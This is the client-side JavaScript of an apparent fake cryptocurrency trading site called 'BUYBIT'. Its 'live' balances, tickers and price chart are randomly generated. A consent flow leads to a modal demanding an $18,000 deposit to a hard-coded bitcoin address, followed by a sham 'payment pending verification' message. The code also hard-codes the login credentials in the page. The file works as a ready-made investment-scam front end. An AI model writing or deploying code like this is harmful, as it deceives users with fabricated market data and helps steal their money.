const AUTH_USERNAME = 'LetLoveLead@buybit';
const AUTH_PASSWORD = 'LetLoveLead420';

// Ensure mobile copies work with the same JS behavior — no extra action needed here.
const AUTH_KEY = 'buybit-authenticated';
const REDIRECT_KEY = 'buybit-redirect';
const PAID_KEY = 'buybit-hasPaid';

const liveValues = document.querySelectorAll('.live-number');
const assetAmount = document.querySelector('.asset-number');
let baseAsset = 96000;

function formatNumber(value, isInt = false) {
  if (isInt) {
    return Math.round(value).toLocaleString('en-US');
  }
  return value.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

function randomDelta(max) {
  return (Math.random() - 0.5) * max;
}

function updateLiveNumbers() {
  if (assetAmount) {
    baseAsset = Math.max(0.01, baseAsset + randomDelta(0.015));
    assetAmount.textContent = formatNumber(baseAsset);
  }

  liveValues.forEach((el) => {
    const original = parseFloat(el.dataset.value.replace(/,/g, '')) || 0;
    const formatInt = el.dataset.format === 'int';
    const delta = randomDelta(Math.max(original * 0.015, 0.4));
    const nextValue = Math.max(0, original + delta);
    el.textContent = formatNumber(nextValue, formatInt);
  });
}

function addSparkline() {
  const sparkline = document.querySelector('.sparkline');
  if (!sparkline) return;
  const svgNS = 'http://www.w3.org/2000/svg';
  const svg = document.createElementNS(svgNS, 'svg');
  svg.setAttribute('viewBox', '0 0 220 70');
  svg.setAttribute('aria-hidden', 'true');
  const path = document.createElementNS(svgNS, 'path');
  const points = [15,42, 40,28, 62,45, 90,30, 118,35, 146,20, 178,28, 205,24];
  const d = points.reduce((acc, point, index) => index === 0 ? `M ${point}` : `${acc} L ${point}`, '');
  path.setAttribute('d', d);
  path.setAttribute('fill', 'none');
  path.setAttribute('stroke', 'rgba(241, 143, 4, 0.98)');
  path.setAttribute('stroke-width', '3');
  path.setAttribute('stroke-linecap', 'round');
  path.setAttribute('stroke-linejoin', 'round');
  svg.appendChild(path);
  sparkline.appendChild(svg);
}

function animateChartPanels() {
  const charts = document.querySelectorAll('.chart-box, .chart-panel');
  charts.forEach((chart) => {
    chart.style.animation = 'pulse 8s ease-in-out infinite';
  });
}

/* Live trading chart (simulated feed) */
function initLiveTradingChart() {
  if (getPageName() !== 'trade.html') return;

  const panel = document.querySelector('.chart-panel');
  if (!panel) return;

  // Create canvas
  let canvas = panel.querySelector('canvas');
  if (!canvas) {
    canvas = document.createElement('canvas');
    panel.appendChild(canvas);
  }
  const ctx = canvas.getContext('2d');

  function resize() {
    const rect = panel.getBoundingClientRect();
    canvas.width = Math.floor(rect.width * devicePixelRatio);
    canvas.height = Math.floor(rect.height * devicePixelRatio);
    canvas.style.width = rect.width + 'px';
    canvas.style.height = rect.height + 'px';
    ctx.setTransform(devicePixelRatio, 0, 0, devicePixelRatio, 0, 0);
  }

  window.addEventListener('resize', resize);
  resize();

  // Seed prices array
  const tickerEl = document.querySelector('.trade-ticker');
  let base = 78287.6;
  if (tickerEl) {
    const txt = tickerEl.textContent.trim().split(' ')[0].replace(/,/g,'');
    const parsed = parseFloat(txt);
    if (!isNaN(parsed)) base = parsed;
  }

  const points = [];
  const maxPoints = 120;

  function randomMove(prev) {
    const vol = Math.max(0.05, Math.abs(prev) * 0.0006);
    return prev + (Math.random() - 0.5) * vol;
  }

  for (let i = 0; i < maxPoints; i++) {
    base = randomMove(base);
    points.push(base);
  }

  function draw() {
    const w = canvas.width / devicePixelRatio;
    const h = canvas.height / devicePixelRatio;
    ctx.clearRect(0,0,w,h);

    // background gradient
    const grad = ctx.createLinearGradient(0,0,0,h);
    grad.addColorStop(0, 'rgba(241,143,4,0.06)');
    grad.addColorStop(1, 'rgba(8,10,16,0.02)');
    ctx.fillStyle = grad;
    ctx.fillRect(0,0,w,h);

    // chart area padding
    const padding = 8;
    const chartW = w - padding*2;
    const chartH = h - padding*2;

    // min/max
    const min = Math.min(...points);
    const max = Math.max(...points);
    const range = Math.max(0.0001, max - min);

    ctx.lineWidth = 2;
    ctx.strokeStyle = 'rgba(241,143,4,0.98)';
    ctx.beginPath();
    points.forEach((p, i) => {
      const x = padding + (i / (maxPoints - 1)) * chartW;
      const y = padding + (1 - (p - min) / range) * chartH;
      if (i === 0) ctx.moveTo(x, y);
      else ctx.lineTo(x, y);
    });
    ctx.stroke();

    // fill under curve
    ctx.lineTo(padding + chartW, padding + chartH);
    ctx.lineTo(padding, padding + chartH);
    ctx.closePath();
    ctx.fillStyle = 'rgba(241,143,4,0.06)';
    ctx.fill();

    // draw latest price
    const latest = points[points.length-1];
    ctx.fillStyle = 'rgba(255,255,255,0.9)';
    ctx.font = '12px Arial';
    ctx.fillText(latest.toFixed(2) + ' USD', padding + 6, padding + 14);
  }

  function tick() {
    const last = points[points.length-1];
    const next = randomMove(last);
    points.push(next);
    if (points.length > maxPoints) points.shift();
    draw();

    // update ticker text
    const tickerTextEl = document.querySelector('.trade-ticker');
    if (tickerTextEl) {
      const change = ((next - points[points.length-2]) / points[points.length-2]) * 100;
      const sign = change >= 0 ? '+' : '';
      tickerTextEl.innerHTML = next.toFixed(2) + ' <span class="' + (change>=0? 'positive':'negative') + '">' + sign + change.toFixed(2) + '%</span>';
    }
  }

  // run
  draw();
  const interval = setInterval(tick, 1000);

  // cleanup if navigating away
  window.addEventListener('beforeunload', () => clearInterval(interval));
}

function getPageName() {
  return window.location.pathname.split('/').pop() || 'index.html';
}

function isAuthenticated() {
  return sessionStorage.getItem(AUTH_KEY) === 'true';
}

function hasPaid() {
  return sessionStorage.getItem(PAID_KEY) === 'true';
}

function saveRedirectTarget() {
  sessionStorage.setItem(REDIRECT_KEY, getPageName());
}

function getRedirectTarget() {
  return sessionStorage.getItem(REDIRECT_KEY) || 'overview.html';
}

function clearRedirectTarget() {
  sessionStorage.removeItem(REDIRECT_KEY);
}

function requireAuth() {
  const pageName = getPageName();
  // Allow access to the login page always
  if (pageName === 'login.html') {
    return;
  }

  // If not authenticated, save where they tried to go and force login
  if (!isAuthenticated()) {
    saveRedirectTarget();
    window.location.href = 'login.html';
    return;
  }

  // If authenticated but haven't paid, only allow the legal pages (contract & compliance) and login
  if (!hasPaid() && pageName !== 'index.html' && pageName !== 'btc-compliance.html' && pageName !== 'login.html') {
    // send them to the contract pack to accept terms and pay
    window.location.href = 'index.html';
  }
}

function handleLoginPage() {
  if (getPageName() !== 'login.html') {
    return;
  }

  const usernameInput = document.querySelector('#login-username');
  const passwordInput = document.querySelector('#login-password');
  const loginButton = document.querySelector('#login-submit');
  const errorElement = document.querySelector('#auth-error');

  if (!usernameInput || !passwordInput || !loginButton || !errorElement) {
    return;
  }

  if (isAuthenticated()) {
    const destination = getRedirectTarget();
    clearRedirectTarget();
    window.location.href = destination;
    return;
  }

  function showError(message) {
    errorElement.textContent = message;
  }

  function attemptLogin() {
    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();

    if (username === AUTH_USERNAME && password === AUTH_PASSWORD) {
      sessionStorage.setItem(AUTH_KEY, 'true');
      clearRedirectTarget();
      // After login, always redirect to the Contract Pack (index.html)
      window.location.href = 'index.html';
      return;
    }

    showError('Invalid username or password. Please try again.');
  }

  loginButton.addEventListener('click', attemptLogin);
  passwordInput.addEventListener('keypress', (event) => {
    if (event.key === 'Enter') {
      attemptLogin();
    }
  });
}

function handleLegalConsent() {
  const contractCheckbox = document.querySelector('#contract-accept');
  const complianceCheckbox = document.querySelector('#compliance-accept');
  const contractButton = document.querySelector('#next-to-compliance');
  const agreeButton = document.querySelector('#agree-to-login');

  if (contractCheckbox && contractButton) {
    contractCheckbox.addEventListener('change', () => {
      contractButton.disabled = !contractCheckbox.checked;
    });
    contractButton.addEventListener('click', () => {
      if (contractCheckbox.checked) {
        // move to BTC compliance page first (popup appears after compliance)
        window.location.href = 'btc-compliance.html';
      }
    });
  }

  if (complianceCheckbox && agreeButton) {
    complianceCheckbox.addEventListener('change', () => {
      agreeButton.disabled = !complianceCheckbox.checked;
    });
    agreeButton.addEventListener('click', () => {
      if (complianceCheckbox.checked) {
        showDepositModal('overview.html');
      }
    });
  }
}

function showDepositModal(destination) {
  // create overlay and modal using themed classes
  const overlay = document.createElement('div');
  overlay.className = 'deposit-modal-overlay';

  const modal = document.createElement('div');
  modal.className = 'deposit-modal';

  modal.innerHTML = `
    <h3>Deposit required</h3>
    <p>Please deposit <strong>$18,000.00 USD</strong> to the BUYBIT settlement address to continue. Once you have completed the payment, check the box below and click "Confirm Payment".</p>
    <div style="margin:8px 0">
      <div style="font-size:0.95rem;color:var(--text);margin-bottom:6px">Wallet address</div>
      <div style="display:flex;gap:8px;align-items:center">
        <code id="deposit-address" style="background:rgba(255,255,255,0.03);padding:8px 10px;border-radius:8px;flex:1;overflow:auto">bc1q5cpwfus6rzq6gngqxmpqjluf7tpyyd8shv866m</code>
        <button id="deposit-copy-btn" class="btn btn-outline" style="white-space:nowrap">Copy</button>
      </div>
    </div>
    <label class="deposit-checkbox"><input type="checkbox" id="deposit-confirm-checkbox" /> I have paid $18,000.00</label>
    <div class="deposit-actions">
      <button id="deposit-cancel" class="btn btn-secondary">Cancel</button>
      <button id="deposit-confirm" class="btn btn-primary" disabled>Confirm Payment</button>
    </div>
  `;

  overlay.appendChild(modal);
  document.body.appendChild(overlay);

  const checkbox = modal.querySelector('#deposit-confirm-checkbox');
  const confirmBtn = modal.querySelector('#deposit-confirm');
  const cancelBtn = modal.querySelector('#deposit-cancel');

  checkbox.addEventListener('change', () => {
    confirmBtn.disabled = !checkbox.checked;
  });

  cancelBtn.addEventListener('click', () => {
    document.body.removeChild(overlay);
  });

  confirmBtn.addEventListener('click', () => {
    // mark payment acknowledged; in real app this should be verified server-side
    sessionStorage.setItem(PAID_KEY, 'true');
    document.body.removeChild(overlay);
    // show verification modal and then navigate
    showVerificationModal(destination);
  });

  // copy wallet address handler
  const copyBtn = modal.querySelector('#deposit-copy-btn');
  const addressEl = modal.querySelector('#deposit-address');
  if (copyBtn && addressEl) {
    copyBtn.addEventListener('click', async () => {
      const txt = addressEl.textContent.trim();
      try {
        await navigator.clipboard.writeText(txt);
        copyBtn.textContent = 'Copied';
        setTimeout(() => (copyBtn.textContent = 'Copy'), 2000);
      } catch (e) {
        const range = document.createRange();
        range.selectNodeContents(addressEl);
        const sel = window.getSelection();
        sel.removeAllRanges();
        sel.addRange(range);
      }
    });
  }
}

function showVerificationModal(destination) {
  const overlay = document.createElement('div');
  overlay.className = 'deposit-modal-overlay';

  const modal = document.createElement('div');
  modal.className = 'deposit-modal';
  modal.innerHTML = `
    <h3>Payment pending verification</h3>
    <p>Your payment will be verified within 24 hours. Once confirmed, full access to the site and its features will be granted.</p>
    <div class="deposit-actions">
      <button id="verify-close" class="btn btn-primary">OK</button>
    </div>
  `;

  overlay.appendChild(modal);
  document.body.appendChild(overlay);

  const closeBtn = modal.querySelector('#verify-close');
  closeBtn.addEventListener('click', () => {
    document.body.removeChild(overlay);
    if (destination) window.location.href = destination;
    else window.location.href = 'overview.html';
  });
}

function showPaymentNotification() {
  const note = document.createElement('div');
  note.textContent = 'Thank you — your payment will be confirmed within 24 hours and your account will be fully activated.';
  note.style.position = 'fixed';
  note.style.bottom = '20px';
  note.style.left = '50%';
  note.style.transform = 'translateX(-50%)';
  note.style.background = '#111';
  note.style.color = '#fff';
  note.style.padding = '12px 18px';
  note.style.borderRadius = '6px';
  note.style.boxShadow = '0 6px 20px rgba(0,0,0,0.3)';
  note.style.zIndex = 10000;
  document.body.appendChild(note);
  setTimeout(() => {
    note.style.transition = 'opacity 0.5s ease';
    note.style.opacity = '0';
    setTimeout(() => note.remove(), 500);
  }, 5000);
}

function populateProfileFromSession() {
  if (!isAuthenticated()) {
    return;
  }

  const profileName = document.querySelector('#profile-name');
  if (profileName) {
    profileName.textContent = AUTH_USERNAME;
  }
}

function attachLogoutHandlers() {
  const logoutButtons = document.querySelectorAll('.logout-btn');
  logoutButtons.forEach((button) => {
    button.addEventListener('click', () => {
      sessionStorage.removeItem(AUTH_KEY);
      clearRedirectTarget();
      window.location.href = 'login.html';
    });
  });
}

window.addEventListener('DOMContentLoaded', () => {
  requireAuth();
  handleLoginPage();
  handleLegalConsent();
  populateProfileFromSession();
  attachLogoutHandlers();
  addSparkline();
  initLiveTradingChart();
  animateChartPanels();
  updateLiveNumbers();
  setInterval(updateLiveNumbers, 2200);
});
